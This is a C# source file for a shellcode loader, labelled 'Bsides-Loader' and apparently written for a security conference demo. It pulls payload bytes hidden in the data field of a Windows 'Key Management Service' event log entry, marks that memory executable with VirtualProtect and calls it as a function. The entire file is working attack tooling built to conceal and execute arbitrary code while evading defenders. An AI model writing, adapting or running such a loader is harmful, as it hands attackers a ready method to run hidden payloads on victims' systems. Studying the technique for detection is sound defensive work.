using System;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;

namespace Bsides
{
    class Program
    {
        [DllImport("kernel32.dll")]
        public static extern Boolean VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, UInt32 flNewProtect,
   out UInt32 lpflOldProtect);

        private delegate IntPtr ptrShellCode();
        public static byte[] StringToByteArray(string hex)
        {
            return Enumerable.Range(0, hex.Length)
                             .Where(x => x % 2 == 0)
                             .Select(x => Convert.ToByte(hex.Substring(x, 2), 16))
                             .ToArray();
        }
        static void Main(string[] args)
        {
            Console.WriteLine("Bsides-Loader");

            EventLog myEventLog1 = new EventLog();

            myEventLog1.Log = "Key Management Service";

            EventLogEntryCollection myEventLogEntryCollection = myEventLog1.Entries;

            byte[] data_array = myEventLogEntryCollection[0].Data;
            var number = data_array.Length;
            Console.WriteLine("Found Payload in Event Log Entries");

            string eval = string.Empty;
            string data = BitConverter.ToString(myEventLogEntryCollection[0].Data);
            eval += data;
            string str = eval.Replace("-", "");

            Console.WriteLine("Payload is: " + data_array.Length + " Bytes");
            Console.WriteLine("Payload String is: " + str);


            // Payload Injection Starts Here
            GCHandle SCHandle = GCHandle.Alloc(data_array, GCHandleType.Pinned);
            IntPtr SCPointer = SCHandle.AddrOfPinnedObject();
            uint flOldProtect;

            if (VirtualProtect(SCPointer, (UIntPtr)data_array.Length, 0x40, out flOldProtect))
            {
                ptrShellCode sc = (ptrShellCode)Marshal.GetDelegateForFunctionPointer(SCPointer, typeof(ptrShellCode));
                sc();

            }
        }
    }
}
